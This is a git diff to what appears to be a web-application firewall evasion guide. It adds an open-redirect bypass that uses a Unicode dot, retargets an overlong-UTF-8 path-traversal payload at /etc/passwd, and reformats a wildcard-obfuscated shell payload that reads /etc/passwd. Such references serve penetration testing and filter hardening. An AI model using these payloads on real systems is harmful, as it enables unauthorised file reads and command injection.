@@ -1628,8 +1628,11 @@ __3. Unicode Encoding__
 __Standard__: `prompt()`  
 __Obfuscated__: `\u0070r\u06f\u006dpt()`
 
-__Standard__: `../../appusers.txt`  
-__Obfuscated__: `%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFappusers.txt`
+__Blocked__: `/?redir=http://google.com`  
+__Bypassed__: `/?redir=http://google。com`
+
+__Standard__: `../../etc/passwd`  
+__Obfuscated__: `%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd`
 
 __4. HTML Encoding__
 - Often web apps encode special characters into HTML encoding and render accordingly.
@@ -1739,7 +1742,7 @@ __Obfuscated__: <code>$aaaaaa<b>/bin</b>$bbbbbb<b>/cat</b>$ccccccc $dddddd<b>/et
 
 An exotic payload crafted:
 ```
-$sdijchkd<b>/???</b>$sdjhskdjh<b>/??t</b>$skdjfnskdj $sdofhsdhjs<b>/???</b>$osdihdhsdj<b>/??ss??</b>$skdjhsiudf
+$sdijchkd/???$sdjhskdjh/??t$skdjfnskdj $sdofhsdhjs/???$osdihdhsdj/??ss??$skdjhsiudf
 ```
 
 __12. Random Tabs__
